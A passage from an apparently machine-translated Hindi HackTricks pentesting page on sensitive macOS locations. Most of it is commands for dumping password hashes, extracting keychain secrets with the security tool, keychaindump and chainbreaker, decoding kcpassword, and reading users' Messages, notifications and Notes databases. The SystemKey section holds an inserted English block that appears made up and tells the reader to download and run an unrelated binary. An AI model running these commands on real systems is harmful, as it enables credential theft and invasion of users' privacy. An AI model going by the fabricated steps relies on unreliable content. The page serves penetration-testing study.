# macOS संवेदनशील स्थान

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## पासवर्ड

### छाया पासवर्ड

छाया पासवर्ड उपयोगकर्ता के कॉन्फ़िगरेशन के साथ संग्रहीत होता है जो **`/var/db/dslocal/nodes/Default/users/`** में स्थित plists में होता है।\
निम्नलिखित वनलाइनर का उपयोग करके **उपयोगकर्ताओं के बारे में सभी जानकारी** (हैश जानकारी सहित) डंप करने के लिए किया जा सकता है:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**इस तरह के स्क्रिप्ट**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**इस तरह के स्क्रिप्ट**](https://github.com/octomagon/davegrohl.git) का उपयोग करके हैश को **हैशकैट** **फॉर्मेट** में बदला जा सकता है।

एक वैकल्पिक वन-लाइनर जिससे हैशकैट फॉर्मेट `-m 7100` (macOS PBKDF2-SHA512) में सभी गैर-सेवा खातों के क्रेडेंशियल्स डंप होंगे:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### कीचेन डंप

ध्यान दें कि security बाइनरी का उपयोग करके पासवर्ड डिक्रिप्ट करके डंप करने के लिए, कई प्रॉम्प्ट्स उपयोगकर्ता से यह कार्रवाई अनुमति देने के लिए पूछेंगे।
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
इस टिप्पणी [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) के आधार पर ऐसा लगता है कि ये उपकरण अब बिग सर में काम नहीं कर रहे हैं।
{% endhint %}

हमलावर अभी भी **रूट** विशेषाधिकारों को प्राप्त करने के लिए सिस्टम तक पहुंचने की आवश्यकता होती है ताकि **keychaindump** को चलाया जा सके। इस दृष्टिकोण के साथ अपनी खुद की शर्तें होती हैं। पहले ही उल्लिखित की गई तरह, **लॉगिन के बाद आपका कीचेन डिफ़ॉल्ट रूप से अनलॉक हो जाता है** और जब तक आप अपने सिस्टम का उपयोग करते हैं, वह अनलॉक ही रहता है। यह सुविधा के लिए है ताकि उपयोगकर्ता को हर बार अप्लिकेशन को कीचेन तक पहुंच करने के लिए पासवर्ड दर्ज करने की आवश्यकता न हो। यदि उपयोगकर्ता ने इस सेटिंग को बदल दिया है और हर उपयोग के बाद कीचेन को लॉक करने का चयन किया है, तो keychaindump काम नहीं करेगा; यह अनलॉक कीचेन पर निर्भर करता है।

यह महत्वपूर्ण है कि Keychaindump मेमोरी से पासवर्ड निकालता है कैसे निकालता है। इस संदर्भ में सबसे महत्वपूर्ण प्रक्रिया है "सुरक्षा डी" प्रक्रिया। Apple इस प्रक्रिया को अधिकृतता और गणितीय संचालन के लिए एक सुरक्षा संदर्भ डीमन के रूप में संदर्भित करता है। Apple डेवलपर पुस्तकालयों में इसके बारे में बहुत कुछ नहीं कहती हैं; हालांकि, वे हमें बताते हैं कि सुरक्षा डी की कीचेन तक पहुंच को हैंडल करता है। अपने शोध में, जूसो सुरक्षा डी को डिक्रिप्ट करने के लिए आवश्यक कुंजी के रूप में संदर्भित करता है। इसे प्राप्त करने के लिए कई कदम उठाने होते हैं क्योंकि यह उपयोगकर्ता के ओएस एक्स लॉगिन पासवर्ड से प्राप्त होता है। यदि आप कीचेन फ़ाइल पढ़ना चाहते हैं तो आपके पास इस मास्टर कुंजी की आवश्यकता होती है। इसे प्राप्त करने के लिए निम्नलिखित कदम उठाए जा सकते हैं। **सुरक्षा डी के हीप का स्कैन करें (keychaindump इसे vmmap कमांड के साथ करता है)**। संभावित मास्टर कुंजी MALLOC\_TINY के रूप में फ़्लैग किए गए क्षेत्र में संग्रहीत होती हैं। आप इन हीप की स्थानों को निम्नलिखित कमांड के साथ देख सकते हैं:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** फिर लौटे हुए हीप्स की खोज करेगा 0x0000000000000018 के प्रकट होने पर। यदि निम्नलिखित 8-बाइट मान वर्तमान हीप को दर्शाता है, तो हमें एक संभावित मास्टर कुंजी मिल गई है। यहां एक डीओबफस्केशन का थोड़ा सा होना चाहिए जो स्रोत कोड में देखा जा सकता है, लेकिन विश्लेषक के रूप में सबसे महत्वपूर्ण बात यह है कि इस सूचना को डिक्रिप्ट करने के लिए आवश्यक डेटा सुरक्षाद की प्रक्रिया की मेमोरी में संग्रहीत होता है। यहां कुंजीचेन डंप आउटपुट का एक उदाहरण है।
```bash
sudo ./keychaindump
```
### चेनब्रेकर

[**चेनब्रेकर**](https://github.com/n0fate/chainbreaker) का उपयोग एक फोरेंसिक रूप से संग्रहीत करने के लिए किया जा सकता है और इससे निम्नलिखित प्रकार की जानकारी निकाली जा सकती है:

* हैश किंचेन पासवर्ड, [हैशकैट](https://hashcat.net/hashcat/) या [जॉन द रिपर](https://www.openwall.com/john/) के साथ क्रैक करने के लिए उपयुक्त
* इंटरनेट पासवर्ड
* सामान्य पासवर्ड
* निजी कुंजी
* सार्वजनिक कुंजी
* X509 प्रमाणपत्र
* सुरक्षित नोट्स
* एपलशेयर पासवर्ड

किंचेन अनलॉक पासवर्ड, [वोलाफॉक्स](https://github.com/n0fate/volafox) या [वोलेटिलिटी](https://github.com/volatilityfoundation/volatility) का उपयोग करके प्राप्त किए गए मास्टर कुंजी, या सिस्टमकी जैसे अनलॉक फ़ाइल के साथ, चेनब्रेकर भी प्लेनटेक्स्ट पासवर्ड प्रदान करेगा।

किंचेन को अनलॉक करने के इन तरीकों में से किसी एक के बिना, चेनब्रेकर सभी उपलब्ध जानकारी प्रदर्शित करेगा।

### **किंचेन की कुंजीयों को डंप करें**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **सिस्टमकी के साथ कीचेन कुंजी (साथ में पासवर्ड) डंप करें**

To dump keychain keys (with passwords) using SystemKey, follow these steps:

1. Open Terminal and run the following command to download SystemKey:
```
curl -O https://github.com/kennytm/SystemKeychain/raw/master/SystemKeychain
```

2. Make the downloaded file executable by running the following command:
```
chmod +x SystemKeychain
```

3. Run the SystemKeychain command with the `-d` option to dump the keychain keys:
```
./SystemKeychain -d
```

4. Enter your user account password when prompted.

5. The keychain keys, along with their passwords, will be dumped and displayed in the Terminal.

By following these steps, you can easily dump keychain keys (including passwords) using SystemKey.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **कीचेन कुंजीयों (साथ ही पासवर्ड के साथ) को हैश को क्रैक करके डंप करें**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **मेमोरी डंप के साथ कीचेन कुंजीयों (साथ पासवर्ड) को डंप करें**

[इन चरणों का पालन करें](..#dumping-memory-with-osxpmem) एक **मेमोरी डंप** करने के लिए।
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **उपयोगकर्ता के पासवर्ड का उपयोग करके कीचेन की कुंजीयों (साथ ही पासवर्डों) को डंप करें**

यदि आप उपयोगकर्ता का पासवर्ड जानते हैं, तो आप इसका उपयोग करके उपयोगकर्ता के कीचेन की कुंजीयों को डंप और डिक्रिप्ट कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** फ़ाइल एक फ़ाइल है जो **उपयोगकर्ता का लॉगिन पासवर्ड** रखती है, लेकिन केवल तभी जब सिस्टम के मालिक ने **स्वचालित लॉगिन सक्षम** किया हो। इसलिए, उपयोगकर्ता को पासवर्ड के बिना स्वचालित रूप से लॉगिन किया जाएगा (जो बहुत सुरक्षित नहीं है)।

पासवर्ड **`/etc/kcpassword`** फ़ाइल में **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** कुंजी के साथ संग्रहीत किया जाता है। यदि उपयोगकर्ता का पासवर्ड कुंजी से लंबा है, तो कुंजी का पुनः उपयोग किया जाएगा।\
इससे पासवर्ड को पुनर्प्राप्त करना बहुत आसान हो जाता है, उदाहरण के लिए [**इस**](https://gist.github.com/opshope/32f65875d45215c3677d) तरह के स्क्रिप्ट का उपयोग करके।

## डेटाबेस में दिलचस्प जानकारी

### संदेश
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### सूचनाएं

आप `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` में सूचनाएं डेटा ढूंढ सकते हैं।

अधिकांश रोचक जानकारी **ब्लॉब** में होगी। इसलिए आपको उस सामग्री को **निकालने** और **मानव-पठनीय** बनाने या **`strings`** का उपयोग करने की आवश्यकता होगी। इसे एक्सेस करने के लिए आप निम्नलिखित कर सकते हैं:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### नोट्स

उपयोगकर्ताओं के **नोट्स** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में मिल सकते हैं।

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने का उपयोग करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
